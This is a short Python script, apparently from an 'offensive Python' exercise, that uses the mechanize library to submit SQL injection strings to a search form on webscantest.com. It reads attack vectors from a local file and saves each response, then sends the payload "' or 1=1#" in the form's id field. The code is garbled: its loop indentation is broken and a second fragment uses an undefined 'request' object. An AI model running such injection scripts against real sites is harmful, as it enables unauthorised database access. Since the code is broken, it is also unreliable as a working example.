import mechanize
#import module
#Set the URL
url = 'http://www.webscantest.com/datastore/search_by_id.php'

browser = mechanize.Browser()

attackNumber = 1

# Read attack vectors

with open('/home/lev/python/offensivePython/attack-vector.txt') as f:
	#Send request with each attack vector
	for line in f:
		browser.open(url)
browser.select_form(nr=0)
browser["id"] = line
res = browser.submit()
content = res.read()

#write the response to file
output = open('response/'+str(attackNumber)+'.txt', 'w')

output.write(content)

output.close()

print(attackNumber)
attackNumber += 1












request.open(url)

#Selected the first form in the page
request.select_form(nr=0)

#Set the ID
request["id"] = "' or 1=1#"
#Submit the form 
response = request.submit()

content = response.read()
print(content)
